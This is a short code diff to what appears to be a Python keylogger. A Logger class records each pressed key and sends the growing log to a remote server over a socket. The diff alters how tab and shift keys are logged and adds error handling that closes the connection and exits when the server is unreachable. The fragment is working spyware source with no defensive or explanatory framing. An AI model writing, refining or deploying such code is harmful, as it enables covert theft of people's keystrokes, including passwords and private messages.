@@ -21,12 +21,16 @@ class Logger():
     elif key == "space":
       key = " "
     elif key == "tab":
-      key = "  tab  "
+      key = ""
     elif key == "shift":
-      key = "  shift  " 
+      key = "" 
     #Logging and sending to server
     self.log += key
-    self.s.send(self.log.encode())
+    try:
+      self.s.send(self.log.encode())
+    except ConnectionError:
+      self.s.close()
+      sys.exit()
 
   # Start listening
   def start(self):
